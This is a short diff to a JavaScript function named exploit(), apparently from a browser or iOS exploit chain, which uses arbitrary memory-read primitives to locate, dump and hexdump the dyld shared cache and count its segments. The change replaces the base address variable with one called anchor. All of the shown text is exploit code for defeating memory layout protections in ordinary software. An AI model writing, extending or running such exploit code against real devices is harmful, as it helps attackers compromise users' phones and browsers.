@@ -501,9 +501,9 @@ function exploit(){
 	    log('[+] Which has magic '+magic.toString(16));
 	   // memory.read_i32(magic);
 	    //log('magic = ' + magic);
-	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0x10, 100)); //dump first 100-bytes
+	    var dcache_dump = String.fromCharCode(...memory.copyfrom(anchor, 0x10, 100)); //dump first 100-bytes
 	    log('[+] Dumping dyld shared cache...');
-	    log(hexdump(dcache_dump, 0, dcache_base));
+	    log(hexdump(dcache_dump, 0, anchor));
 	    var dcache_base_seg = null;
 	    var dcache_nsegs = memory.read_i32(dcache_base + 0x10);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
